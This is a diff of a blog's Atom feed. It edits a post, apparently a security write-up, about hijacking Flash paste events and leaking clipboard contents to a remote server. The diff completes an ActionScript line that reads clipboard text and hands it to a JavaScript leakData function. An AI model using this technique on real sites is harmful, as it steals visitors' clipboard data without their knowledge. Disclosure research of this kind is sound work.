@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Flash | Defined Misbehaviour]]></title>
   <link href="http://blog.saynotolinux.com/blog/categories/flash/atom.xml" rel="self"/>
   <link href="http://blog.saynotolinux.com/"/>
-  <updated>2015-08-02T15:31:41-07:00</updated>
+  <updated>2015-08-02T15:42:03-07:00</updated>
   <id>http://blog.saynotolinux.com/</id>
   <author>
     <name><![CDATA[Jordan Milne]]></name>
@@ -128,9 +128,9 @@ wrapInListeners(target, Event.PASTE, tempJackClipboard);
 
 <h3>Leaking clipboard contents to a remote server</h3>
 
-<p>Unfortunately, I couldn&rsquo;t find a way to make Flash send HTTP requests while inside the event handler. However, we can pass the data to JavaScript and have <em>it</em> send the data to our servers, since our ActionScript won&rsquo;t block JS:</p>
+<p>Unfortunately, I couldn&rsquo;t find a way to make Flash send HTTP requests while inside the event handler. However, we can pass the data to JavaScript and have <em>it</em> send the data to our servers, since our ActionScript handlers won&rsquo;t block JS:</p>
 
-<pre><code class="as3">ExternalInterface.call('leakData', Clipboard.generalClipboard.getData(...))
+<pre><code class="as3">ExternalInterface.call('leakData', Clipboard.generalClipboard.getData(ClipboardFormats.TEXT_FORMAT) as String);
 </code></pre>
 
 <pre><code class="js">function leakData(data) {
